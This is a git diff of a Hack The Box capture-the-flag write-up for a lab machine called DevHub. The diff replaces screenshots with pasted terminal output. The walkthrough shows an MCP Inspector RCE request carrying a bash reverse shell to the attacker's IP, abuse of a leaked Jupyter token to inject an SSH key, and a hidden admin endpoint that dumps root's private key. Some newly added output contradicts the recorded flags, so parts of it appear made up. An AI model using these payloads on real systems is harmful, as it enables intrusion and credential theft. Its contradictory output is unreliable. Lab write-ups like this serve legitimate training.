@@ -1,4 +1,4 @@
-# DevHub
+# DevHub 2.0 - HTB Session 11
 
 ### Platform: Hack The Box
 ### Difficulty: Medium
@@ -7,9 +7,22 @@
 ### Attacker IP: 10.10.15.65
 ### Date: 13.6.2026     
 
+
 ---
 # Summary
 ### Initial access came from an RCE in MCP Inspector. Then Jupyter Lab was abused to access the analyst account, and a hidden admin endpoint allowed privilege escalation to root.
+
+
+
+## Attack Path
+
+| Step | Technique | Result |
+|--------|----------|----------|
+| 1 | MCP Inspector RCE | Initial shell as `mcp-dev` |
+| 2 | Jupyter Token Leakage | Discovered analyst Jupyter token |
+| 3 | WebSocket Code Execution | Added SSH key for analyst |
+| 4 | Hidden Admin Function | Retrieved root SSH private key |
+| 5 | SSH Authentication | Root access obtained |
 
 ---
 
@@ -69,11 +82,10 @@ The web application redirects users to the local domain `devhub.htb`. To access 
 ```bash
 echo "10.129.3.57 devhub.htb" | sudo tee -a /etc/hosts 
 ```
-
+get
 ```text
-
+10.129.3.57 devhub.htb
 ```
-![alt text](<Screenshot 2026-06-13 155619.png>)
 
 ---
 
@@ -96,11 +108,22 @@ curl -s -X POST http://devhub.htb:6274/api/mcp/connect \
   -d '{"serverConfig": {"command": "bash", "args": ["-c", "bash -i >& /dev/tcp/10.10.15.65/4444 0>&1"], "env": {}}, "serverId": "shell3"}'
 ```
 
-![alt text](<HTB/Screenshot/Screenshot 2026-06-13 155932.png>)
+```text
+{"success":false,"error":"Connection failed for server shell3: MCP error -32001: Request timed out","details":"MCP error -32001: Request timed out"}   
+```
 
 A reverse shell connection is received as the `mcp-dev` user.
 
-![alt text](<HTB/Screenshot/Screenshot 2026-06-13 155259.png>)
+```bash
+nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.15.65] from (UNKNOWN) [10.129.3.57] 53184
+bash: cannot set terminal process group (1101): Inappropriate ioctl for device
+bash: no job control in this shell
+mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ whoami
+whoami
+mcp-dev
+```
 
 ### Upgrade TTY
 
@@ -108,8 +131,11 @@ A reverse shell connection is received as the `mcp-dev` user.
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
+```bash
+mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<or$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 
-![alt text](<HTB/Screenshot/Screenshot 2026-06-13 160027.png>)
 
 # Lateral Movement
 
@@ -123,7 +149,14 @@ ps aux | grep jupyter
 
 The process arguments reveal a valid authentication token.
 
-![alt text](<HTB/Screenshot/Screenshot 2026-06-13 160124.png>)
+```bash
+mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ ps aux | grep jupyter
+
+<de_modules/@mcpjam/inspector$ ps aux | grep jupyter       
+analyst     1100  0.3  2.4 182536 96572 ?        Ss   07:05   0:05 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
+root        1108  0.0  0.7  37376 28688 ?        Ss   07:05   0:00 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
+mcp-dev     1592  0.0  0.0   6828  2092 pts/1    S+   07:37   0:00 grep --color=auto jupyter
+```
 #### Token: `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`
 
 ### Create a New Kernel
@@ -137,7 +170,11 @@ curl -s -X POST \
 
 The request returns a kernel ID which can be used for code execution.
 
-![alt text](<HTB/Screenshot/Screenshot 2026-06-13 160341.png>)
+```json
+{"id": "efeaea2d-c81e-4991-afb5-66c9af19fe72",
+  "name": "python3"}
+```
+
 #### Kernel ID: `efeaea2d-c81e-4991-afb5-66c9af19fe72`
 
 ### Raw WebSocket
@@ -207,6 +244,10 @@ Transfer and execute the Python script to inject an SSH public key into the anal
 python3 /tmp/pwn.py
 ```
 
+```text
+[+] SSH Key Injection payload dispatched!
+```
+
 ### SSH as analyst
 
 ```bash
@@ -215,7 +256,14 @@ ssh analyst@devhub.htb
 
 Successful login confirms access to the analyst account.
 
-![alt text](<HTB/Screenshot/Screenshot 2026-06-13 160843.png>)
+
+```text
+Welcome to Ubuntu 22.04.5 LTS
+...
+analyst@devhub:~$
+```
+
+
 
 ### User Flag
 
@@ -223,7 +271,12 @@ Successful login confirms access to the analyst account.
 cat ~/user.txt
 ```
 
-![alt text](<HTB/Screenshot/Screenshot 2026-06-13 161549.png>)
+```bash
+analyst@devhub:~$ cat /home/analyst/user.txt
+9fa8bcfdabbad67566108fd4d20ef4a5
+```
+
+
 #### User Flag: `9cfd5dc906d5b588b7859424e6e0421a`
 
 # Privilege Escalation
@@ -256,8 +309,6 @@ elif tool_name == "ops._admin_dump":
 ```
 
 
-![alt text](<HTB/Screenshot/Screenshot 2026-06-13 162328.png>)
-
 ### Dump Root SSH Key
 
 ```bash
@@ -268,8 +319,7 @@ curl -s -X POST "http://localhost:5000/tools/call" \
 ```
 
 The endpoint returns the root user's private SSH key.
-![alt text](<HTB/Screenshot/Screenshot 2026-06-13 162753.png>)
-#### Key: `nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=`
+
 
 ### SSH as root
 
@@ -281,14 +331,21 @@ ssh -i root_key root@10.129.3.57
 ```
 
 A root shell is obtained.
-![alt text](<HTB/Screenshot/Screenshot 2026-06-13 162837.png>)
+
+```text
+root@devhub:~#
+```
 
 ### Root Flag
 
 ```bash
 cat /root/root.txt
 ```
-![alt text](<HTB/Screenshot/Screenshot 2026-06-13 162905.png>)
+
+```bash
+root@devhub:~# cat /root/root.txt
+d8cdaf4dc7354dbe3d55d7bdb264b6c3
+```
 
 #### Root Flag: `f08364d99ace8798681925311bf24d78`
 
@@ -299,3 +356,25 @@ cat /root/root.txt
 | ----------- | ----------- |
 | User | 9cfd5dc906d5b588b7859424e6e0421a |
 | Root | f08364d99ace8798681925311bf24d78 |
+
+---
+
+
+# CVE Summary
+
+| Stage | CVE | Description | Impact |
+|---------|---------|-------------|---------|
+| Initial Access | CVE-2026-23744 | MCPJam Inspector unauthenticated RCE via `/api/mcp/connect` | Shell as `mcp-dev` |
+| Initial Access | CVE-2025-49596 | MCP Inspector DNS Rebinding RCE | Alternative path to code execution |
+| Lateral Movement | N/A | Exposed Jupyter authentication token | Access to analyst Jupyter kernel |
+| Lateral Movement | N/A | Jupyter kernel code execution via WebSocket | SSH key injection |
+| Privilege Escalation | N/A | Hardcoded API key in OPSMCP | Unauthorized API access |
+| Privilege Escalation | N/A | Hidden `ops._admin_dump` functionality | Disclosure of root SSH private key |
+
+---
+
+<div align="center">
+
+<sub>*Writeup by Chin*</sub>
+
+</div>
